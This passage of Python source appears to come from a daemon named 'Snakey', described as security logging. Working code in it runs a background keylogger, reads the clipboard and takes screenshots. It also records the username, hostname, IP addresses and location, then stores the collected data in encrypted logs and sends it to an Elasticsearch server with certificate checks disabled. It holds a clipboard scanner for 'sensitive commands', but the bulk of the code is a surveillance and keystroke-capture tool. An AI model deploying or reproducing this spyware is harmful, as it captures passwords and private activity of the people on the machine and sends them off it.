config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef check_disk_space(path: str, min_free_mb: int) -> bool:\r\n    \"\"\"Checks if there's enough free disk space at a given path.\"\"\"\r\n    try:\r\n        total, used, free = shutil.disk_usage(path)\r\n        free_mb = free / (1024 * 1024)\r\n        if free_mb < min_free_mb:\r\n            logger.warning(f\"Low disk space detected in {path}: {free_mb:.2f} MB free. Operations might be impacted.\", extra={\"path\": path, \"free_mb\": free_mb, \"min_free_mb\": min_free_mb})\r\n            return False\r\n        logger.debug(f\"Disk space OK in {path}: {free_mb:.2f} MB free.\")\r\n        return True\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check disk space for {path}: {e}\", exc_info=True, extra={\"path\": path})\r\n        return True # Assume OK if check fails, to avoid halting the daemon\r\n\r\ndef log_to_wazuh_file(data: dict):\r\n    \"\"\"Logs session data to a file in a Wazuh-compatible JSON format.\"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(data, default=str) + \"\\n\")\r\n        logger.info(\"Log written to Wazuh-compatible file.\", extra={\"log_file\": wazuh_log_file})\r\n    except Exception as e:\r\n        logger.error(f\"Wazuh log file write failed: {e}\", exc_info=True, extra={\"log_file\": wazuh_log_file})\r\n\r\ndef save_session_to_json(session_data: dict, filepath: str):\r\n    \"\"\"\r\n    Appends session data as a new JSON object to the specified file.\r\n    Each object is on a new line to make it easier to read/parse as NDJSON.\r\n    \"\"\"\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in session_data and isinstance(session_data['timestamp'], datetime):\r\n            session_data['timestamp'] = session_data['timestamp'].isoformat()\r\n        \r\n        with open(filepath, \"a\", encoding='utf-8') as f:\r\n            f.write(json.dumps(session_data, default=str) + \"\\n\")\r\n        logger.info(f\"Session log appended to JSON file: {filepath}\", extra={\"log_file\": filepath})\r\n    except Exception as e:\r\n        logger.error(f\"Failed to write session log to JSON file {filepath}: {e}\", exc_info=True, extra={\"log_file\": filepath})\r\n\r\ndef send_to_elasticsearch(data: dict):\r\n    \"\"\"Sends collected session data to Elasticsearch.\"\"\"\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty for Kibana visualization (empty list is fine, None is bad)\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []\r\n            if not data_to_send.get('virustotal'):\r\n                data_to_send['virustotal'] = {}\r\n\r\n            logger.debug(f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\", extra={\"timestamp\": data_to_send['timestamp']})\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            logger.info(f\"Log sent to Elasticsearch. ID: {response['_id']}\", extra={\"es_id\": response['_id']})\r\n        except ConnectionError as e:\r\n            logger.error(f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        except AuthenticationException as e:\r\n            logger.error(f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        except TransportError as e:\r\n            logger.error(f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code, \"es_info\": e.info})\r\n        except Exception as e:\r\n            logger.error(f\"Unexpected failure sending log to Elasticsearch: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_send_error\"})\r\n    else:\r\n        logger.warning(\"Elasticsearch client is not configured or connected. Log will not be sent.\")\r\n\r\n\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Analyzes clipboard content for predefined sensitive command patterns.\"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            logger.info(f\"Sensitive CMD command detected in clipboard.\", extra={\"matched_command\": sensitive_cmd, \"clipboard_snippet\": clipboard_content[:100]})\r\n\r\n    return alerts_list\r\n\r\n\r\ndef check_country_change(current_country: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    last_country_path = os.path.join(base_path, \"last_country.txt\")\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\", encoding='utf-8') as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                logger.info(f\"Country changed: {last_country} -> {current_country}\", extra={\"old_country\": last_country, \"new_country\": current_country})\r\n        with open(last_country_path, \"w\", encoding='utf-8') as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        logger.error(f\"Failed to check/update last country: {e}\", exc_info=True)\r\n    return alerts_list\r\n\r\n\r\ndef check_vpn_proxy_ip(current_ip: str, alerts_list: list[str]) -> list[str]:\r\n    \"\"\"Checks if the current public IP is in a list of known VPN/proxy IPs.\"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        logger.info(f\"Access from known VPN/proxy IP detected: {current_ip}\", extra={\"ip_address\": current_ip})\r\n    return alerts_list\r\n\r\n\r\n# === Keylogger Thread Function ===\r\ndef on_press_threaded(key):\r\n    \"\"\"Callback for pynput.keyboard.Listener on key press event.\"\"\"\r\n    global KEYLOGGER_KEYS\r\n    try:\r\n        if hasattr(key, 'char') and key.char is not None:\r\n            KEYLOGGER_KEYS.append(key.char)\r\n        elif key == Key.space:\r\n            KEYLOGGER_KEYS.append(' ')\r\n        elif key == Key.enter:\r\n            KEYLOGGER_KEYS.append('[ENTER]')\r\n        elif key == Key.backspace:\r\n            KEYLOGGER_KEYS.append('[BACKSPACE]')\r\n        elif key == Key.tab:\r\n            KEYLOGGER_KEYS.append('[TAB]')\r\n        else:\r\n            KEYLOGGER_KEYS.append(f\"[{str(key).replace('Key.', '')}]\")\r\n    except Exception as e:\r\n        logger.error(f\"Error in on_press_threaded keylogger: {e}\", exc_info=True)\r\n\r\ndef keylogger_thread_func():\r\n    \"\"\"Function to be run in a separate thread for continuous keylogging.\"\"\"\r\n    global KEYLOGGER_LISTENER\r\n    logger.info(\"Keylogger thread started.\")\r\n    try:\r\n        with Listener(on_press=on_press_threaded) as KEYLOGGER_LISTENER:\r\n            KEYLOGGER_LISTENER.join() # This will block until listener.stop() is called\r\n    except Exception as e:\r\n        logger.critical(f\"Keylogger thread encountered a critical error: {e}. Keylogger will terminate.\", exc_info=True)\r\n    finally:\r\n        logger.info(\"Keylogger thread terminated.\")\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session() -> dict:\r\n    \"\"\"Collects a full session's worth of system data, activities, and alerts.\"\"\"\r\n    current_time = datetime.now(timezone.utc)\r\n    session_log: dict = {\r\n        \"timestamp\": current_time.isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\", # Will be populated from global KEYLOGGER_KEYS\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n            logger.warning(f\"Could not get private IP: {e}\", extra={\"error\": str(e)})\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip: str | None = None\r\n        current_country: str | None = None\r\n        try:\r\n            ip_info_response = requests_get(\"https://ipinfo.io/json\", timeout=5)\r\n            ip_info_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)\r\n            ip_info = ip_info_response.json()\r\n\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if current_country and current_country not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {current_country}\")\r\n                logger.info(f\"Access from untrusted country: {current_country}\", extra={\"country\": current_country})\r\n\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            logger.warning(\"IP info lookup timed out.\", extra={\"error_type\": \"ipinfo_timeout\"})\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            logger.error(f\"IP info lookup failed: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_request_error\"})\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            logger.error(f\"Unexpected error during IP info lookup: {e}\", exc_info=True, extra={\"error_type\": \"ipinfo_unexpected_error\"})\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info collection error: {e}\")\r\n        logger.error(f\"System info collection error: {e}\", exc_info=True)\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(str(session_log[\"clipboard\"])) # Ensure clipboard is string before hashing\r\n\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            logger.error(f\"Clipboard error: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        logger.info(\"Clipboard collection skipped (not Windows).\")\r\n\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_file_path = os.path.join(base_path, screenshot_information)\r\n    if platform.system() == \"Windows\":\r\n        # Check disk space before attempting screenshot\r\n        if not check_disk_space(base_path, MIN_FREE_DISK_MB):\r\n            session_log[\"alerts\"].append(\"Screenshot skipped due to low disk space.\")\r\n            logger.warning(\"Screenshot skipped due to low disk space.\")\r\n        else:\r\n            try:\r\n                im = ImageGrab.grab()\r\n                im.save(screenshot_file_path)\r\n                session_log[\"screenshot_taken\"] = True\r\n                session_log[\"screenshot_hash\"] = hash_file(screenshot_file_path)\r\n\r\n                vt_result = vt_lookup_file(screenshot_file_path)\r\n                if vt_result:\r\n                    session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                    if vt_result.get(\"malicious\", 0) > 0:\r\n                        session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                        logger.info(f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n                else:\r\n                    logger.info(\"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n            except Exception as e:\r\n                session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n                logger.error(f\"Screenshot error: {e}\", exc_info=True)\r\n            finally:\r\n                if os.path.exists(screenshot_file_path):\r\n                    try:\r\n                        os.remove(screenshot_file_path)\r\n                        logger.debug(f\"Removed temporary screenshot file: {screenshot_file_path}\")\r\n                    except Exception as e:\r\n                        logger.error(f\"Failed to remove temporary screenshot file: {e}\", exc_info=True)\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n        logger.info(\"Screenshot collection skipped (not Windows).\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith((\"http://\", \"https://\")):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                logger.info(f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\", extra={\"vt_result\": vt_result})\r\n        else:\r\n            logger.info(\"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger: Collect accumulated keys from the dedicated keylogger thread\r\n    global KEYLOGGER_KEYS\r\n    session_log[\"keystrokes\"] = ''.join(KEYLOGGER_KEYS)\r\n    KEYLOGGER_KEYS = [] # Reset for the next collection cycle\r\n    logger.info(f\"Collected {len(session_log['keystrokes'])} keystrokes from keylogger thread.\")\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    if not check_disk_space(encrypted_path, MIN_FREE_DISK_MB):\r\n        session_log[\"alerts\"].append(\"Encryption and ledger update skipped due to low disk space.\")\r\n        logger.error(\"Encryption and ledger update skipped due to low disk space in encrypted_path.\")\r\n        return session_log # Exit without updating ledger for this log\r\n\r\n    try:\r\n        # 1. Prepare the full log for encryption\r\n        log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n        session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)\r\n\r\n        # 2. Encrypt the entire session log\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file (Atomic Write)\r\n        temp_enc_file_path = os.path.join(encrypted_path, f\".{encrypted_filename}.tmp\")\r\n        try:\r\n            with tempfile.NamedTemporaryFile(mode='wb', delete=False, dir=encrypted_path) as temp_f: # mode 'wb' for binary data\r\n                temp_f.write(encrypted_log_data)\r\n            shutil.move(temp_f.name, full_encrypted_filepath)\r\n            logger.info(f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n        except Exception as e:\r\n            logger.error(f\"Failed to save encrypted log atomically: {e}\", exc_info=True, extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(f\"Failed to save encrypted log: {e}\")\r\n            if os.path.exists(temp_enc_file_path):\r\n                os.remove(temp_enc_file_path)\r\n            return session_log # Critical failure, return\r\n\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            logger.error(\"Failed to hash encrypted log file. Ledger will not be updated with this log.\", extra={\"file_path\": full_encrypted_filepath})\r\n            session_log[\"alerts\"].append(\"Failed to hash encrypted log file. Ledger not updated.\")\r\n            return session_log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger: list[dict] = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": 